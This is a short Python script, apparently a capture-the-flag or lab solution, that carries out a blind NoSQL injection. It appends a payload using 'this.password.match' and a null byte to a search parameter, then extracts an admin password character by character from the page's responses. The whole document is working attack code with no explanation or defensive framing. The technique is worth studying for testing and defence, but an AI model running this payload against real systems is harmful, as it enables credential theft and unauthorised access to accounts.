import requests

URL='http://<url>/?search=admin'

def char_range(c1, c2):
    """Generates the characters from `c1` to `c2`, inclusive."""
    for c in range(ord(c1), ord(c2)+1):
        yield chr(c)

searchrange = ['-','_']
searchrange+=char_range('0', '9')
searchrange+=char_range('a','z')
searchrange+=char_range('A','Z')

print(searchrange)

def checkResponse(text):
    pattern='%27%20%26%26%20this.password.match(/'+text+'/)%00'
    response = requests.get(URL+pattern)
    return "search=admin" in response.text

password = ""
while(True):
    for c in searchrange:
        print("Test: "+c)
        if(checkResponse('^'+password+c+'.*$')):
            password+=c
            print("Password: "+password)
            break


